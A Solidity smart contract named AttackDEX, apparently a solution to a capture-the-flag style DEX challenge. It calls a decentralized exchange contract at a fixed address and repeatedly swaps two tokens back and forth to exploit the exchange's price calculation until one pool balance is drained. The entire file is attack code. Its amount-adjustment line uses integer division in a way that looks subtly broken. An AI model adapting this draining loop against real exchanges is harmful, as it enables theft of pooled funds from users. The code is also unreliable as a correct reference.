pragma solidity ^0.6.0;

interface IDEX {
  function token1() external returns(address);
  function token2() external returns(address);
  function swap(address from, address to, uint amount) external;
  function getSwapPrice(address from, address to, uint amount) external view returns(uint);
  function balanceOf(address token, address account) external view returns (uint);
}

contract AttackDEX {
    
    IDEX level;
    address token1; //convenience
    address token2;

    constructor() public {
        level = IDEX(0x9C586B2df310f4EbB9EbF70AbF263FAF44A995CE);
        token1 = level.token1();
        token2 = level.token2();
    }

    // must first approve this contract to spend tokens
    function attack() public {
        address levelAddress = address(level);
        address from;
        address to;
        while(level.balanceOf(token1, levelAddress) != 0 && level.balanceOf(token2, levelAddress) != 0 ){
            if (level.balanceOf(token1, address(this)) > 0 ){
                // swap token 1 -> 2
                from = token1;
                to = token2;
            } else {
                // swap token 2 -> 1
                from = token2;
                to = token1;
            }
            // check if we can swap all the tokens
            uint amountIn = level.balanceOf(from, address(this));
            uint amountOut = level.getSwapPrice(from, to, amountIn);
            uint levelBalance = level.balanceOf(to, levelAddress);
            if (amountOut > levelBalance){
                // if we cant, adjust the amountIn
                amountIn *= levelBalance/amountIn;
            }
            level.swap(from, to, amountIn);
        }
    }  
}


